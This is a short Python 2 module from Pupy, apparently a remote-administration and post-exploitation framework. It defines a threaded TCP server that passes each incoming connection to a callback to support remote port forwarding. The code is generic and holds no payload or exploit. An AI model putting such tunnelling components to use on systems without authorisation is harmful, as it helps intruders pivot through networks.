# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import SocketServer
import threading
class RemotePortFwdRequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        self.server.callback(self.request)


class RemotePortFwdServer(SocketServer.TCPServer):
    allow_reuse_address = True
    def __init__(self, server_address, bind_and_activate=True, callback=None):
        self.callback=callback
        SocketServer.TCPServer.__init__(self, server_address, RemotePortFwdRequestHandler, bind_and_activate)
    def start_serve(self):
        t=threading.Thread(target=self.serve_forever)
        t.daemon=True
        t.start()
        

class ThreadedRemotePortFwdServer(SocketServer.ThreadingMixIn, RemotePortFwdServer):
    def __str__(self):
        return "<RemotePortForward remote=%s>"%str(self.server_address)
